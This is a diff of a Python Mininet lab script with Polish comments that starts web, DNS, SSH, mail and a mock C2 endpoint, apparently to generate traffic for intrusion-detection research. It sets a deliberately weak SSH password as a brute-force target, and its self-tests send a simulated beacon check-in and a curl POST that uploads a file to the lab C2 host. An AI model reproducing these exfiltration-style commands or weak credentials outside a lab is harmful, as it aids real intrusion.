@@ -1,15 +1,16 @@
 #!/usr/bin/env python3
-"""Usługi w sieci Mininet: web, DNS, SSH/SFTP, poczta, strony "zewnętrzne", endpoint beaconingu.
+"""Usługi w sieci Mininet: web, DNS, SSH/SCP, poczta, strony "zewnętrzne", endpoint beaconingu.
 
-Usługa działa „w sieci” hosta, ale na wspólnym dysku. Host Minineta ma osobną sieć (przestrzeń nazw),
+Usługa działa "w sieci" hosta, ale na wspólnym dysku. Host minineta ma osobną sieć (przestrzeń nazw),
 ale ten sam system plików i tych samych użytkowników co WSL. Wynikają z tego że
 każda usługa ma własny katalog aby logi i PIDy różnych usług się nie mieszały.
 
 Są dwa rodzaje procesów usług:
-- serwery w Pythonie (http.server, smtpd, nasłuch beaconingu) - uruchamiane przez popen i zatrzymywane terminate
-- deamony - serwery systemowe  (apache2, dnsmasq, sshd) - uruchamiane przez cmd i zatrzymywane kill na PID 
+- serwery w pythonie (http.server, mailsink na bibliotece aiosmtpd, nasłuch beaconingu) - uruchamiane przez popen i zatrzymywane terminate
+- deamony - serwery systemowe  (apache2, dnsmasq, sshd) - uruchamiane przez cmd; dnsmasq i sshd zatrzymywane
+  kill na PID, apache2 przez apache2 -k stop
 
-Lista handles to rejestr wszystkich uruchomionych usług - każdy element mówi jak dana usługę zatrzymać.
+Lista handles to rejestr wszystkich uruchomionych usług - każdy element mówi jak dana usługę zatrzymać
 
 Nazwy domen laboratorium:
   - firma.lab          - strefa wewnętrzna (web, dns, ssh, files, mail)
@@ -20,12 +21,12 @@ Uruchomienie samodzielne (buduje topologię, startuje usługi, testuje, zatrzymu
     python3 env/services.py --cli        # po testach konsola Mininetu
 """
 import argparse
-import json
+import json #wyniki testów
 import os
 import random #losowe rozmiary plików
 import subprocess #pkill i DEVNULL dla usług
-import sys
-import time
+import sys 
+import time 
 
 from mininet.log import setLogLevel
 
@@ -37,27 +38,30 @@ import profiles  # stąd biorą się nazwy plików na serwerze i ich liczba. - g
 
 #Stałe
 LAB = "/tmp/lab" #katalog roboczy - każda usługa dostaje podkatalog na konfiguracje logi i plik PID
+
 #ścieżka do katalogu, w którym leżą dwa serwery w Pythonie
 BIN = os.path.join(os.path.dirname(os.path.abspath(__file__)), "services_bin")
+
 SSH_USER = "labuser"
-SSH_PASS = "Lab1234!"    #konto testowe(cel brute-force'a)
-INT_DOMAIN = "firma.lab"
+SSH_PASS = "Lab1234!" #konto testowe(cel brute-force'a)
+
 #nazwy domen: wewnętrzna i zewnętrzna (internet) - .example nigdy nie wskaże prawdziwej domeny
+INT_DOMAIN = "firma.lab"
 EXT_DOMAIN = "lab-ext.example"
 
 #moduły Apache doładowywane w konfiguracji (Ubuntu 22.04; log_config i unixd są już wbudowane,
-#sprawdzone przez apache2 -l 29.10.2026, więc nie trzeba ich LoadModule)
+#sprawdzone przez apache2 -l, więc nie trzeba ich LoadModule)
 APACHE_MODULES = """LoadModule mpm_prefork_module /usr/lib/apache2/modules/mod_mpm_prefork.so 
 LoadModule authz_core_module /usr/lib/apache2/modules/mod_authz_core.so
 LoadModule mime_module /usr/lib/apache2/modules/mod_mime.so
 LoadModule dir_module /usr/lib/apache2/modules/mod_dir.so"""
 #doładowane moduły Apache: mpm_prefork - jeden proces apache na jedno połączenie,
-#  authz_core obsługa require all granted,
-#  mime - typ zawartości w odp np. text/html, dir - zapytanie o / zwraca index.html
+#authz_core obsługa require all granted,
+#mime - typ zawartości w odp np. text/html, dir - zapytanie o / zwraca index.html
 
 
 
-#tworzy katalog i pozwala dokładać podkatalogi np. host_dir("web", "www") -> /tmp/lab/web/www
+#tworzy katalog i pozwala dokładać podkatalogi np. host_dir("web", "www") daje /tmp/lab/web/www
 def host_dir(name, *sub):
     path = os.path.join(LAB, name, *sub)
     os.makedirs(path, exist_ok=True)
@@ -91,50 +95,53 @@ def ensure_ssh_user():
     os.system(f"echo '{SSH_USER}:{SSH_PASS}' | chpasswd") # ustawia hasło dla konta 
 
 #generuje parę kluczy SSH ed25519 i dopisuje klucz publiczny do authorized_keys labusera,
-#żeby generator ruchu mógł robić scp/sftp bez podawania hasła
+#żeby generator ruchu mógł robić scp bez podawania hasła
 def ensure_client_key():
     key = host_dir("_client") + "/id_ed25519" # ścieżka do klucza prywatnego
     if not os.path.exists(key):
         os.system(f"ssh-keygen -q -t ed25519 -N '' -f {key}") #generuje klucz
     sshdir = f"/home/{SSH_USER}/.ssh" #katalog .ssh u labusera
     os.makedirs(sshdir, exist_ok=True)
-    os.system(f"cat {key}.pub > {sshdir}/authorized_keys")
+    os.system(f"cat {key}.pub > {sshdir}/authorized_keys") #nadpisuje - zawsze tylko jeden klucz
     # ustawiamy poprawne uprawnienia 700 na katalog i 600 na klucz 
     # - jeśli katalog ma inne uprawnienia to sshd odmawia logowania kluczem
     os.system(f"chown -R {SSH_USER}:{SSH_USER} {sshdir}; chmod 700 {sshdir}; chmod 600 {sshdir}/authorized_keys")
-    return key
+    return key #zwraca sciezke klucza do generatora ruchu
 
-# rozmiar pliku: ciało log-normalne (mediana ~4 KB) + rzadki ogon Pareto (duże pliki).
-# Ciężki ogon rozmiarów plików WWW: Crovella i Bestavros 1997; konkretne parametry mój wybór.
-WEB_FILE_MIN_BYTES = 256
-WEB_FILE_MAX_BYTES = 8 * 1024 * 1024
+#rozmiar pliku: ciało log-normalne (mediana ~4 KB) + rzadki ogon Pareto (duże pliki).
+#ciężki ogon rozmiarów plików WWW; konkretne wartości to mój wybór
+WEB_FILE_MIN_BYTES = 256 
+WEB_FILE_MAX_BYTES = 8 * 1024 * 1024 # 8 MB
 
 
-#losuje rozmiar jednego pliku: 10% to ogon pareto (duże pliki), a reszta to małe pliki (mice)
+
+#losuje rozmiar jednego pliku: 10% to ogon pareto (duże pliki), a reszta to małe pliki
 def heavy_tailed_size(rng):
     if rng.random() < 0.10:
-        # ogon: duże pliki (elephant flows), skala ~100 KB, alpha ~1,2 -> od 100 KB do kilku MB
+        #ogon: duże pliki (elephant flows), skala ~100 KB, alpha ~1,2: od 100 KB w górę; przy 200 plikach
+        #(ziarno 1234) największy ma ok. 0,95 MB, na xweb (40 plików) ok. 180 KB
         size = 100_000 * rng.paretovariate(1.2)
     else:
-        size = rng.lognormvariate(8.3, 1.0)                  # ciało (mice): mediana ~4 KB
+        #ciało: małe pliki (mice), mediana ~4 KB
+        size = rng.lognormvariate(8.3, 1.0) 
     return int(max(WEB_FILE_MIN_BYTES, min(size, WEB_FILE_MAX_BYTES)))
 
 
-#dla każdej nazwy tworzy plik i wywołuje f.truncate(rozmiar) - powstaje plik rzadki: system zapisuje tylko
+#dla każdej nazwy tworzy plik i wywołuje f.truncate(rozmiar) - powstaje plik rzadki(sparse file): system zapisuje tylko
 #jego rozmiar, nie zapisuje bajtów na dysk, a przy czytaniu zwraca zera. Apache i scp wysyłają wtedy
 #pełny rozmiar, więc przepływy w sieci są prawdziwej wielkości a dysk pozostaje pusty.
 def make_files(directory, names, seed):
-    rng = random.Random(seed)
+    rng = random.Random(seed) #przy każym uruchomieniu powstają te same rozmiary
     for name in names:
         with open(os.path.join(directory, name), "wb") as f:
             f.truncate(heavy_tailed_size(rng))
 
 
-# zawartość serwera web: index.html + kilkaset plików o ciężkoogonowych rozmiarach,
-# pobieranych później z popularnością Zipf (wybór pliku robi generator ruchu)
+#zawartość serwera web: index.html + 200 plików (profiles.WEB_FILE_COUNT)
+#pobieranych później z popularnością Zipf (wybór pliku robi generator ruchu)
 def make_web_content(www):
     write(os.path.join(www, "index.html"),
-          "<html><body><h1>Intranet firma.lab</h1><p>Strona testowa.</p></body></html>\n")
+          "<html><body><h1>Intranet firma.lab</h1><p>Strona testowa - pozdrawiam kekola</p></body></html>\n")
     make_files(www, profiles.web_file_names(), seed=1234)
 
 
@@ -143,7 +150,7 @@ def make_web_content(www):
 def start_web(host, handles):
     d = host_dir("web") #katalog roboczy dla hosta web
     www = host_dir("web", "www") #podkatalog - folder z plikami ktore serwer udostępnia
-    make_web_content(www) #tworzymy zawartość
+    make_web_content(www) #tworze zawartość
     conf = f"""ServerName web.{INT_DOMAIN} 
 ServerRoot {d} 
 PidFile {d}/apache2.pid
@@ -166,7 +173,8 @@ MaxRequestWorkers 20
 """
     write(f"{d}/apache2.conf", conf)
     out = host.cmd(f"apache2 -d {d} -f {d}/apache2.conf -k start 2>&1") #start deamona w przestrzeni nazw web
-    #pod obciążeniem start trwa różnie długo: czekam (do 10 s), aż serwer naprawdę odpowie.
+    #pod obciążeniem start trwa różnie długo: czekam, aż serwer naprawdę odpowie (40 prób co 0,25 s,
+    #do ok. 10 s przy odmowie połączenia, do ok. 50 s, gdy port przyjmuje, ale serwer milczy)
     code = ""
     for _ in range(40):
         code = host.cmd(f"curl -s -o /dev/null -w '%{{http_code}}' --max-time 1 http://{host.IP()}/").strip()
@@ -177,11 +185,12 @@ MaxRequestWorkers 20
         tail = host.cmd(f"tail -5 {d}/error.log 2>&1")
         print(f"[web] Apache nie odpowiada (HTTP {code or 'brak'}). start: {out.strip()}\n"
               f"[web] error.log:\n{tail}", file=sys.stderr)
-    # stop: łagodne zatrzymanie przez apache2 -k stop
+    #stop: apache2 -k stop - sygnał do procesu głównego, który kończy też procesy potomne
+    #(natychmiast, bez czekania na trwające połączenia; czekanie to -k graceful-stop)
     handles.append({"type": "pidfile", "host": host, "pid": f"{d}/apache2.pid",
                     "stop": f"apache2 -d {d} -f {d}/apache2.conf -k stop"})
 
-#adres hosta z topology.py
+#adres hosta po nazwie z topology.py
 def ip(name):
     return topology.HOSTS[name][1]
 
@@ -202,58 +211,64 @@ log-queries
 log-facility={d}/query.log
 pid-file={d}/dnsmasq.pid
 """ + "\n".join(zone_lines) + "\n"
-    write(f"{d}/dnsmasq.conf", conf)
-    host.cmd(f"dnsmasq --conf-file={d}/dnsmasq.conf")
-    handles.append({"type": "pidfile", "host": host, "pid": f"{d}/dnsmasq.pid"})
+    write(f"{d}/dnsmasq.conf", conf) #zapisanie konfigu
+    host.cmd(f"dnsmasq --conf-file={d}/dnsmasq.conf") #start deamona
+    handles.append({"type": "pidfile", "host": host, "pid": f"{d}/dnsmasq.pid"}) #wpisanie do handles, żeby potem zatrzymać
 
-#tworzymy plik hosts.firma mapujący nazwy *.firma.lab dla 5 serwerów,
+#tworze plik hosts.firma mapujący nazwy *.firma.lab dla 5 serwerów,
 #a zapytania o domenę zewnetrzna przekazujemy do xdns - forwardujemy 'internetowe' dalej
 def start_dns_internal(host, handles):
     d = host_dir(host.name)
     servers = ["web", "dns", "ssh", "files", "mail"]
-    # dnsmasq szuka w hosts.firma i odpowiada na zapytania o *.firma.lab
+    #dnsmasq szuka w hosts.firma i odpowiada na zapytania o *.firma.lab
     write(f"{d}/hosts.firma", "".join(f"{ip(name)} {name}.{INT_DOMAIN}\n" for name in servers))
     start_dnsmasq(host, handles, [f"addn-hosts={d}/hosts.firma", f"server=/{EXT_DOMAIN}/{ip('xdns')}"]) 
 
+
 #host xdns jest autorytatywny DNS dla lab-ext.example i ustawia, że wszytko pod tą domeną
 #idzie do c2 a xweb.lab-ext.example do serwera stron.
-#dzięki adress=/lab-ext.example/... dowolna subdomena się rozwiąże (to ważne dla beaconingu C2
-#który może używać losowych nazw subdomen)
+#dzięki adress=/lab-ext.example/... dowolna subdomena się rozwiąże. beacon_client dostaje gotowy adres IP
+#i nie pyta DNS; wildcard sprawdza test (beacon.lab-ext.example), a nazwy news. i cdn. z ruchu
+#normalnego (profiles.py) też wskazują adres c2, choć ruch HTTP tam nie idzie
 def start_dns_external(host, handles):
     start_dnsmasq(host, handles, [f"address=/{EXT_DOMAIN}/{ip('c2')}", f"address=/xweb.{EXT_DOMAIN}/{ip('xweb')}"])
+
 
 #każdy serwer ssh ma własny klucz, którym przedstawia sie klientowi - generujemy go
 #logowanie hasłem (cel brute-force) i logowanie kluczem (normalny ruch generatora) jest włączone
 #root nie moze sie zalogowac wpuszczam tylko labusera
 #każda próba logowania jest zapisywana do sshd.log
-def start_sshd(host, handles, sftp=False): #ssh nie wymaga sftp, files wymaga sftp
+#ta sama funckja odpala sshd na ssh i files oraz na web i mail - admini (sesje ssh_admin w
+#traffic/worker.py) logują się na wszystkie serwery firmy, więc każdy z nich musi mieć sshd
+#scp w OpenSSH 8.9 używa domyślnie klasycznego protokołu SCP, nie SFTP; Subsystem sftp na files
+#przydaje się tylko przy ręcznym sftp, generator i test go nie używają
+def start_sshd(host, handles, sftp=False): #sftp=True tylko dla files
     name = host.name
     d = host_dir(name)
-    key = f"{d}/ssh_host_ed25519_key"
+    key = f"{d}/ssh_host_ed25519_key" #klucz hosta (każdy serwer ma własny) - w ten sposób klient sprawdza czy gada z właściwym serwerem
     if not os.path.exists(key):
         os.system(f"ssh-keygen -q -t ed25519 -N '' -f {key}")
-    os.makedirs("/run/sshd", exist_ok=True)
+    os.makedirs("/run/sshd", exist_ok=True) #katalog seperacji uprawnien musi byc
     subsystem = "Subsystem sftp /usr/lib/openssh/sftp-server" if sftp else ""
     conf = f"""Port 22
 ListenAddress {host.IP()}
 HostKey {key}
 PidFile {d}/sshd.pid
 UsePAM no
-# (komentarze w sshd_config muszą być w osobnych liniach, inaczej trafiają do wartości)
-# logowanie hasłem: cel brute-force
+#logowanie hasłem: cel brute-force
 PasswordAuthentication yes
-# logowanie kluczem: normalny ruch (generator)
+#logowanie kluczem: normalny ruch (generator)
 PubkeyAuthentication yes
 PermitRootLogin no
-# tylko konto testowe
+#tylko konto testowe
 AllowUsers {SSH_USER}
 # zapisuje każdą próbę logowania, udaną i nieudaną
 LogLevel VERBOSE
 {subsystem}
 """
-    write(f"{d}/sshd_config", conf)
-    host.cmd(f"/usr/sbin/sshd -f {d}/sshd_config -E {d}/sshd.log")
-    handles.append({"type": "pidfile", "host": host, "pid": f"{d}/sshd.pid"})
+    write(f"{d}/sshd_config", conf) #zapisanie
+    host.cmd(f"/usr/sbin/sshd -f {d}/sshd_config -E {d}/sshd.log") #start 
+    handles.append({"type": "pidfile", "host": host, "pid": f"{d}/sshd.pid"}) #wpis do handles
 
 #uruchamia services_bin/mailsink.py, czyli prosty serwer smtp na porcie 25 zapisujący
 #pocztę do skrzynki inbox.mbox
@@ -261,22 +276,22 @@ def start_mail(host, handles):
     d = host_dir("mail")
     p = host.popen(["python3", f"{BIN}/mailsink.py", "--bind", host.IP(), "--port", "25",
                     "--mbox", f"{d}/inbox.mbox"],
-                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)  # bez nieczytanego potoku (jak xweb)
-    handles.append({"type": "popen", "host": host, "proc": p})
+                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)  
+    handles.append({"type": "popen", "host": host, "proc": p}) #wpis do handles - popen zarzymuje terminate
 
 # "strona w internecie" - wbudowany python3 -m http.server dający index.html i mniejszy zbiór
-# plików o ciężkoogonowych rozmiarach (jak web, ale mniej); generator pobiera je z popularnością Zipf
+#plików o ciężkoogonowych rozmiarach (jak web, ale mniej)- generator pobiera je z popularnością Zipf
 def start_xweb(host, handles):
     www = host_dir("xweb", "www")
     write(os.path.join(www, "index.html"), "<html><body>External site</body></html>\n")
     make_files(www, profiles.web_file_names(profiles.XWEB_FILE_COUNT), seed=5678) #inne ziarno niz web - inne rozmiary
-    # http.server zapisuje każde żądanie na stderr. Popen w Mininecie daje domyślnie potok, którego nikt
-    # nie czyta: po ok. 64 KiB logu (ok. 1000 żądań) serwer zawieszał się (M0, M2-M4 nagrane 4-5.11).
-    # Log idzie więc do pliku, który przy okazji pozwala sprawdzić, ile żądań dostało odpowiedź.
+    #http.server zapisuje każde żądanie na stderr a popen w mininecie daje domyślnie potok, którego nikt
+    #nie czyta: po ok. 64 KiB logu (ok. 1000 żądań) serwer zawieszał się.
+    #Log idzie więc do pliku, który przy okazji pozwala sprawdzić, ile żądań dostało odpowiedź.
     log = open(os.path.join(host_dir("xweb"), "access.log"), "w")
     p = host.popen(["python3", "-m", "http.server", "80", "--bind", host.IP(), "--directory", www],
-                   stdout=subprocess.DEVNULL, stderr=log)
-    log.close()  # proces potomny ma własną kopię deskryptora
+                   stdout=subprocess.DEVNULL, stderr=log) #wbudownay prosty serwer WWW 
+    log.close()#Skrypt zamyka swoją kopie pliku żeby nie trzymać go niepotrzebnie otwartego
     handles.append({"type": "popen", "host": host, "proc": p})
 
 #uruchamia services_bin/beacon_endpoint.py, serwer do którego beaconing C2 wysyła GET i POST (upload)
@@ -285,13 +300,13 @@ def start_c2(host, handles):
     d = host_dir("c2")
     p = host.popen(["python3", f"{BIN}/beacon_endpoint.py", "--bind", host.IP(), "--port", "80",
                     "--log", f"{d}/requests.log", "--upload-dir", f"{d}/uploads"],
-                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)  # bez nieczytanego potoku (jak xweb)
+                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)#bez nieczytanego potoku (jak xweb)
     handles.append({"type": "popen", "host": host, "proc": p})
 
 #to jest dyrygent usług: tworzy konto i klucz a potem po kolei uruchamia każdą usługę
 #na odpowiednim hoscie  i zwraca listę handles - czyli rejestr wszystkiego, co trzeba będzie zatrzymać
 def start_services(net):
-    kill_leftover_services() #resztki po przerwanym uruchomieniu (np. stary Apache z tym samym plikiem PID)
+    kill_leftover_services() #resztki po przerwanym uruchomieniu
     ensure_ssh_user()
     ensure_client_key()
     handles = []
@@ -300,10 +315,12 @@ def start_services(net):
     start_dns_external(net.get("xdns"), handles)
     start_sshd(net.get("ssh"), handles, sftp=False)
     start_sshd(net.get("files"), handles, sftp=True)
+    start_sshd(net.get("web"), handles)  #dostęp administracyjny (ssh_admin)
+    start_sshd(net.get("mail"), handles)
     start_mail(net.get("mail"), handles)
     start_xweb(net.get("xweb"), handles)
     start_c2(net.get("c2"), handles)
-    time.sleep(2)  # serwery Pythona potrzebują chwili na bind
+    time.sleep(2)#serwery Pythona potrzebują chwili na bind
     return handles
 
 
@@ -314,14 +331,14 @@ def stop_services(handles):
         try:
             if h["type"] == "pidfile":
                 if "stop" in h:
-                    h["host"].cmd(h["stop"])
+                    h["host"].cmd(h["stop"]) #zatrzymanie przez proces główny (Apache)
                 else:
                     h["host"].cmd(f"[ -f {h['pid']} ] && kill $(cat {h['pid']}) 2>/dev/null")
             elif h["type"] == "popen":
                 h["proc"].terminate()
         except Exception:
             pass
-    kill_leftover_services() #dobija tylko nasze usługi, jeśli któraś nie zatrzymała się sama
+    kill_leftover_services()#dobija tylko nasze usługi, jeśli któraś nie zatrzymała się sama
 
 
 #TESTY
@@ -342,35 +359,38 @@ def run_checks(net, client_key):
         if os.path.exists(stale):
             os.remove(stale)
 
-    # web
+    #web
     results["web_http"] = o1.cmd(f"curl -s -o /dev/null -w '%{{http_code}}' http://{ip('web')}/").strip()
     results["web_download"] = o1.cmd(f"curl -s -o /dev/null -w '%{{size_download}}' "
                                      f"http://{ip('web')}/file0001.bin").strip()
     downloaded = results["web_download"]
     checks["web"] = results["web_http"] == "200" and downloaded.isdigit() and int(downloaded) > 0
 
-    # dns wewnętrzny: nazwa -> adres
+    #dns wewnętrzny: nazwa -> adres
     results["dns_internal"] = o1.cmd(f"dig +short +time=2 web.{INT_DOMAIN} @{ip('dns')}").strip()
     checks["dns_internal"] = results["dns_internal"] == ip("web")
-    # dns wewnętrzny forwarduje domenę zewnętrzną do xdns
+    #dns wewnętrzny forwarduje domenę zewnętrzną do xdns
     results["dns_forward"] = o1.cmd(f"dig +short +time=2 beacon.{EXT_DOMAIN} @{ip('dns')}").strip()
     checks["dns_forward"] = results["dns_forward"] == ip("c2")
-    # xdns autorytatywnie (dowolna subdomena -> c2)
+    #xdns autorytatywnie (dowolna subdomena -> c2)
     results["xdns_wildcard"] = o1.cmd(f"dig +short +time=2 x7f3.{EXT_DOMAIN} @{ip('xdns')}").strip()
     checks["xdns"] = results["xdns_wildcard"] == ip("c2")
 
-    # ssh i files: banner + realny scp kluczem
+    #ssh i files: banner + realny scp kluczem
     results["ssh_banner"] = banner(o1, ip("ssh"), 22).strip()
     results["files_banner"] = banner(o1, ip("files"), 22).strip()
     checks["ssh_banner"] = results["ssh_banner"].startswith("SSH-2.0")
     checks["files_banner"] = results["files_banner"].startswith("SSH-2.0")
+    #sshd administracyjny na web i mail (cele sesji ssh_admin)
+    results["admin_ssh_banners"] = [banner(o1, ip(name), 22).strip() for name in ("web", "mail")]
+    checks["admin_ssh"] = all(b.startswith("SSH-2.0") for b in results["admin_ssh_banners"])
     scp = o1.cmd(f"scp -q -i {client_key} -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null "
                  f"-o ConnectTimeout=5 {SSH_USER}@{ip('files')}:/tmp/lab/web/www/file0001.bin /tmp/lab/_client/got.bin "
                  f"2>/dev/null && stat -c %s /tmp/lab/_client/got.bin 2>/dev/null")
     results["files_scp_bytes"] = scp.strip()
     checks["files_scp"] = results["files_scp_bytes"].isdigit() and int(results["files_scp_bytes"]) > 0
 
-    # poczta: banner + wysłanie wiadomości
+    #poczta: banner + wysłanie wiadomości
     results["mail_banner"] = banner(o1, ip("mail"), 25, 40).strip()
     o1.cmd("python3 - <<'PY'\n"
            "import smtplib\n"
@@ -378,21 +398,23 @@ def run_checks(net, client_key):
            "m.sendmail('o1@firma.lab', ['mbox@firma.lab'], 'Subject: test\\n\\ntresc testowa')\n"
            "m.quit()\nPY")
     time.sleep(0.5)
-    results["mail_mbox_lines"] = net.get("mail").cmd("wc -l < /tmp/lab/mail/inbox.mbox 2>/dev/null").strip()
-    checks["mail"] = results["mail_banner"].startswith("220") and results["mail_mbox_lines"] not in ("", "0")
+    #cat ... | wc -l, a nie wc -l < plik: przy braku pliku komunikat błędu powłoki trafiłby do wyniku
+    results["mail_mbox_lines"] = net.get("mail").cmd("cat /tmp/lab/mail/inbox.mbox 2>/dev/null | wc -l").strip()
+    checks["mail"] = (results["mail_banner"].startswith("220") and results["mail_mbox_lines"].isdigit()
+                      and int(results["mail_mbox_lines"]) > 0)
 
-    # xweb
+    #xweb
     results["xweb_http"] = o1.cmd(f"curl -s -o /dev/null -w '%{{http_code}}' http://{ip('xweb')}/").strip()
     checks["xweb"] = results["xweb_http"] == "200"
 
-    # c2: GET (check-in) i POST (upload), rozwiązując nazwę przez xdns
+    #c2: GET (check-in) i POST (upload), rozwiązując nazwę przez xdns
     c2_ip = o1.cmd(f"dig +short +time=2 beacon.{EXT_DOMAIN} @{ip('xdns')}").strip().splitlines()
     c2_ip = c2_ip[0] if c2_ip else ""
     o1.cmd(f"curl -s -o /dev/null http://{c2_ip}/checkin")
     o1.cmd(f"curl -s -o /dev/null -X POST --data-binary @/tmp/lab/web/www/index.html http://{c2_ip}/upload")
     time.sleep(0.5)
-    results["c2_log_lines"] = net.get("c2").cmd("wc -l < /tmp/lab/c2/requests.log 2>/dev/null").strip()
-    checks["c2"] = results["c2_log_lines"] not in ("", "0", "1")
+    results["c2_log_lines"] = net.get("c2").cmd("cat /tmp/lab/c2/requests.log 2>/dev/null | wc -l").strip()
+    checks["c2"] = results["c2_log_lines"].isdigit() and int(results["c2_log_lines"]) >= 2
 
     return results, checks
 
